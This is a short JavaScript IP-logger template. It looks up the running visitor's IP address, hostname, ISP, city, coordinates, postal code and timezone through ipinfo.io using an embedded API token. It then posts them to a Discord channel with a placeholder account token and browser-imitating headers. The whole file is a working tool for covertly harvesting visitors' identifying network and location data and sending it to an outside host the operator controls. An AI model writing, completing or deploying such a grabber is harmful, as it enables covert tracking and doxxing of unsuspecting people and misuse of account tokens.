async function main(){
    const request = await fetch("https://ipinfo.io/json?token=1f39a6dba67005");
    const json = await request.json();
    country = (json["country"]);
    city = (json["city"]);
    hostname = (json["hostname"]);
    ip = (json["ip"]);
    loc = (json["loc"]);
    org = (json["org"]);
    postal = (json["postal"])
    region = (json["region"])
    timezone = (json["timezone"])

    await fetch(`https://discord.com/api/v9/channels/<PUT YOUR CHANNEL ID HERE>/messages`, {
          "headers": {
            "accept": "*/*",
            "accept-language": "en-US,hr-HR;q=0.9",
            "authorization": `<PUT YOUR TOKEN HERE>`,
            "content-type": "application/json",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": "en-US",
          },
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": `{"content": "New connection information - IP: ${ip}, Hostname: ${hostname}, Organistation: ${org}, Country: ${country}, City: ${city}, Location: ${loc}, Postal Code: ${postal}, Region: ${region}, Timezone: ${timezone}","tts":false}`,
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
}